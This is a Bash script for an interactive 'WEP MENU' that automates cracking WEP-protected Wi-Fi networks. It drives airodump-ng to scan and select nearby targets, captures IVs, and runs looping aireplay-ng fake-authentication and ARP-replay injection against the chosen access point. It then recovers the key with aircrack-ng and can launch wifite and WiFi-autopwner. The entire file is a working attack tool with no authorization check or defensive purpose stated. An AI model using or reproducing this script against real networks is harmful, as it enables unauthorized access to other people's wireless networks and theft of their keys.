#! /bin/bash
#############DEFAULTS###############
#setting yellow-start 
YS="\e[1;33m"
#setting color-end
CE="\e[0m"
#setting red-start
RS="\e[1;31m"
#setting frequent stings
YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
PAKT="Press "$YS"any key$CE to"
PAKTC="Press "$YS"any key$CE to continue..."
PAKTGB="Press "$YS"any key$CE to go back..."

####################################
WLANNM=$(cat /root/lscript/wlanmon.txt)
export WLANNM
function dash_calc
{
	
	size=${#TERMINALTITLE}
	calc=$(( 65-size ))
	calc=$(( calc/2 ))
	numcalc=1
	DASHESN="-"
	while [ $numcalc != $calc ]
	do
		DASHESN=""$DASHESN"-"
		numcalc=$(( numcalc+1 ))
	done
	echo -e "$DASHESN"$RS"$TERMINALTITLE"$CE"$DASHESN"
}
function remove_temps
{
	if [[ -f /root/lscript/tempairodump-01.cap ]]
	then
		rm /root/lscript/tempairodump-01.cap
	fi
	if [[ -f /root/lscript/tempairodump-01.csv ]]
	then
		rm /root/lscript/tempairodump-01.csv
	fi
	if [[ -f /root/lscript/tempairodump-01.kismet.netxml ]]
	then
		rm /root/lscript/tempairodump-01.kismet.netxml
	fi
	if [[ -f /root/lscript/tempairodump-01.kismet.csv ]]
	then
		rm /root/lscript/tempairodump-01.kismet.csv
	fi
}
function pre_scan
{
#~ while true
#~ do
	if [[ "$JS" != 1 ]]
	then
		remove_temps
		echo -e "Select what to scan: "
		echo -e ""$YS"ENTER"$CE") All channels"
		echo -e " "$YS"1"$CE"-"$YS"13"$CE") Specific channel"
		echo -e "    "$YS"b"$CE") Go back"
		read CHANNELSL
		if [[ "$CHANNELSL" = "" ]]
		then
			JS=1
			airodump-ng $WLANNM -w /root/lscript/tempairodump
		elif [[ "$CHANNELSL" = "back" || "$CHANNELSL" = "b" ]]
		then
			clear
			#~ CH="0"
			break
		else
			#~ FJC=0
			JC=1
			airodump-ng -c $CHANNELSL $WLANNM -w /root/lscript/tempairodump
		fi
	fi
		ap_sort_and_choose
		if [[ "$APCHOOSE" = "r" ]]
		then
			JS=0
			pre_scan
			#~ continue
		#~ elif [[ "$APCHOOSE" = "back" || "$APCHOOSE" = "b" ]]
		#~ then
			#~ break
		fi	
	#~ done
}
function ap_sort_and_choose
{
while true
do
	clear
	autoapselect
	read APCHOOSE
	clear
	if [[ "$APCHOOSE" = "back" || "$APCHOOSE" = "b" ]]
	then
		break
	elif [[ "$APCHOOSE" = "r" ]]
	then
		JS=0
		pre_scan
		break
	elif [[ "$APCHOOSE" -le "$lines" && "$APCHOOSE" -ge 1 ]]
	then
		if [[ ${ziswep[$APCHOOSE]} != 1 ]]
		then
			echo -e ""$RS"Please select a WEP protected network."$CE""
			sleep 2
			#~ echo -e "Press "$YS"enter"$CE" to go back"
			#~ read
			SELECTED=0
			continue
		fi
		TARGB="${zmac[$APCHOOSE]}"
		TARGC="${zchannel[$APCHOOSE]}"
		TARGE="${zessid[$APCHOOSE]}"
		export TARGB
		export TARGC
		export TARGE
		SELECTED=1
		clear
		break
	fi
done
}
function autoapselect
{
file="/root/lscript/tempairodump-01.csv"
if [[ -f "$file" ]]
then
	lines=$(cat $file | awk '/WPA|WPA2|OPN|WEP/ {print}' | awk 'END{print NR}')
	#add safety-lines
	lines=$((lines+10))
else
	lines=0
fi
n2=1
power=100
if [[ "$lines" != 0 ]]
then
	while [ $n2 -le "$lines" ]
	do
		n3=$((n2+2))
		apower[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "}{if(NR==nn && /WPA|WPA2/)print $8}')
		aopen[$n2]=0
		if [[ ${apower[$n2]} = "" ]]
		then
			aopen[$n2]=1
			apower[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "}{if(NR==nn && /OPN|WEP/)print $9}')
			weptest=$(cat $file | awk -v nn="$n3" '{FS=", "}{if(NR==nn && /WEP/)print $9}')
			if [[ "$weptest" != "" ]]
			then
				iswep[$n2]=1
			else
				iswep[$n2]=0
			fi
		fi
		adata[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "} {if(NR==nn && /WPA|WPA2/)print $10}')
		if [[ ${adata[$n2]} = "" ]]
		then
			adata[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "}{if(NR==nn && /OPN|WEP/)print $11}')
		fi
		aessid[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "} {if(NR==nn && /WPA|WPA2/)print $13}')
		if [[ ${aessid[$n2]} = "" ]]
		then
			aessid[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "}{if(NR==nn && /OPN|WEP/)print $14}')
		fi
		achannel[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "} {if(NR==nn && /WPA|WPA2/)print $4}')
		if [[ ${achannel[$n2]} = "" ]]
		then
			achannel[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "}{if(NR==nn && /OPN|WEP/)print $4}')
		fi
		amac[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "} {if(NR==nn && /WPA|WPA2/)print $1}')
		if [[ ${amac[$n2]} = "" ]]
		then
			amac[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "}{if(NR==nn && /OPN|WEP/)print $1}')
		fi
		powerunfixed="${apower[$n2]}"
		apowerfixed[$n2]=$powerunfixed
		apowerfixed[$n2]=$((power+apowerfixed[$n2]))
		#echo ""$n2") "${apowerfixed[$n2]}"% "${amac[$n2]}" "${achannel[$n2]}" "${adata[$n2]}" "${aessid[$n2]}""
		###DEBUGGING
		#~ echo -e "n2="$n2" ${aessid[$n2]}"
		n2=$(( n2+1 ))
	done
	n3=1
	while [ $n3 -le "$lines" ]
	do
		n=1
		topsignal=100
		while [ $n -le "$lines" ]
		do
			if [[ ${apowerfixed[$n]} -le $topsignal ]]
			then
				lowestn=$n
				topsignal=${apowerfixed[$n]}				
			fi
			n=$((n+1))
		done 
		zn[$n3]=$lowestn
		zopen[$n3]=${aopen[$lowestn]}
		zdata[$n3]=${adata[$lowestn]}
		ziswep[$n3]=${iswep[$lowestn]}
		zessid[$n3]=${aessid[$lowestn]}
		zpowerfixed[$n3]=${apowerfixed[$lowestn]}
		zmac[$n3]=${amac[$lowestn]}
		zchannel[$n3]=${achannel[$lowestn]}
		apowerfixed[$lowestn]=101
		n3=$((n3+1)) 
	done
	n3=1
	echo -e ""$YS"YELLOW"$CE"=WEP-PROTECTED NETWORK"
	echo -e ""$RS"   RED"$CE"=WPA/WPA2-PROTECTED OR OPEN NETWORK"
	echo -e "_________________________________________________________________________________"
	echo -e "     POWER ESSID                                  MAC               CLIENTS  DATA"
	while [ $n3 -le "$lines" ]
	do
		size=${#zessid[$n3]}
		calc=$(( 40-size ))
		numcalc=1
		SPACES=""
		while [ $numcalc != $calc ]
		do
			SPACES=""$SPACES"_"
			numcalc=$(( numcalc+1 ))
		done
		if [[ "$n3" -le 9 ]]
		then
			num=" "$n3""
		else
			num=$n3
		fi
		size=${#zpowerfixed[$n3]}
		if [[ "$size" == 3 ]]
		then
			space=""
		elif [[ "$size" == 2 ]]
		then
			space=" "
		elif [[ "$size" == 1 ]]
		then
			space="  "
		fi
		DATAA=" "$RS"0"$CE""
		if [[ ${zpowerfixed[$n3]} -lt 100 ]]
		then
			size2=${#zessid[$n3]}
			if [[ "$size2" -eq 36 ]]
			then
				zessid[$n3]="____________________________________"
			fi
			START=""
			if [[ ${zopen[$n3]} = 1 ]]
			then
				#~ START="$BS"
				if [[ ${zdata[$n3]} -gt 0 ]]
				then
					CLIENTS="YES"
					DATAA="${zdata[$n3]}"
				else
					CLIENTS="NO "
				fi
			else
				if [[ ${zdata[$n3]} -gt 0 ]]
				then
					CLIENTS="YES"
					#~ START="$YS"
					DATAA="${zdata[$n3]}"
				else
					#~ START="$RS"
					CLIENTS="NO "
				fi
			fi
			if [[ ${ziswep[$n3]} = 1 ]]
			then
				START="$YS"
			else
				START="$RS"
			fi
			echo -e ""$YS""$num""$CE") "$START"${space}"${zpowerfixed[$n3]}"%   "${zessid[$n3]}""$SPACES""${zmac[$n3]}" "$CLIENTS"     "$DATAA""$CE""
		fi
		n3=$((n3+1))
	done
else
	echo -e ""$RS"No networks found nearby."$CE""
fi
echo -e ""$YS" r"$CE") rescan"
echo -e ""$YS" b"$CE") Go back"
echo -e "Choose: "
}
function select_a_network_first
{
	if [[ "$SELECTED" != 1 ]]
	then
		echo -e ""$RS"Select a network first"$CE""
		sleep 3
		OUTPUT=1
	fi
}


####################################
while true
do
	clear
	TERMINALTITLE="WEP MENU"
	dash_calc
	printf '\033]2;WEP MENU\a'
	if [[ "$TARGE" = "" ]]
	then
		TARGE=""$RS"None"$CE""
	fi
	IVF="$WEPF"
	if [[ "$IVF" = "" ]]
	then
		IVF=""$RS"None"$CE""
	fi
	echo -e ""$YS" w"$CE") WifiTe automated tool"
	echo -e ""
	echo -e ""$YS" 1"$CE") Scan networks nearby             Selected:"$YS"$TARGE"$CE""
	echo -e ""$YS" 2"$CE") Start capturing IVs              File:"$YS"$IVF"$CE""
	echo -e ""$YS" 3"$CE") Fakeauth-arpreplay               If no clients connected"
	echo -e ""$YS" 4"$CE") Fakeauth-fragmentation           not yet"
	echo -e ""$YS" 5"$CE") Chop-chop                        not yet"
	echo -e ""$YS" 6"$CE") Aircrack the ivs"
	echo -e ""$YS" 7"$CE") WiFi autopwner - automated tool"
	echo -e ""$YS" 0"$CE") Exit"
	echo -e "Choose: "
	read WEP
	clear
	if [[ "$WEP" = "1" ]]
	then
		pre_scan
	elif [[ "$WEP" = "2" ]]
	then
		echo -e "Enter the name of the file(no extension): "
		echo -e "(don't use the same name twice)"
		read WEPF
		export WEPF
		if [[ ! -d /root/handshakes/WEP ]]
		then
			mkdir /root/handshakes/WEP
		fi
		WEPFF="/root/handshakes/WEP/$WEPF-01.cap"
		export WEPFF
		xterm -geometry 90x15+9999+999999 -T "Capturing IVs" -hold -e "airodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/WEP/$WEPF $WLANNM && echo -e "" && echo -e 'Close this window manually'" & disown
	elif [[ "$WEP" = "w" ]]
	then
		wifite --wep
	elif [[ "$WEP" = "3" ]]
	then
		select_a_network_first
		if [[ "$OUTPUT" == 1 ]]
		then
			continue
		fi
		MYMAC=$(macchanger -s wlan0mon | grep "Current" | cut -d ' ' -f5)
		size=${#MYMAC}
		if [[ "$size" != 17 ]]
		then
			echo -e ""$RS"Could not find your MAC"$CE""
			sleep 2
			continue
		fi
		export MYMAC
		xterm -geometry 90x50+0+0 -T "FAKE AUTHENTICATION" -hold -e "while true; do aireplay-ng -1 0 -a $TARGB -h $MYMAC $WLANNM; sleep 5; done && echo -e '' && echo -e 'Close this window manually'" & disown
		xterm -geometry 90x30+0+999999 -T "ARP-REPLAY" -hold -e "while true; do aireplay-ng -3 -b $TARGB -h $MYMAC $WLANNM; done && echo -e '' && echo -e 'Close this windows manually'" & disown
	#~ elif [[ "$WEP" = "4" ]]
	#~ then
		#~ clear
	#~ elif [[ "$WEP" = "5" ]]
	#~ then
		#~ clear
	elif [[ "$WEP" = "6" ]]
	then
		if [[ ! -f "$WEPFF" ]]
		then
			echo -e ""$RS"File "$WEPFF" not found"$CE""
			sleep 2
		fi
		xterm -T "AIRCRACK THE IVs" -hold -e "aircrack-ng $WEPFF"
	elif [[ "$WEP" = "7" ]]
	then
		cd /root/WiFi-autopwner
		./wifi-autopwner.sh
		cd
	elif [[ "$WEP" = "0" ]]
	then
		exit
	fi
done
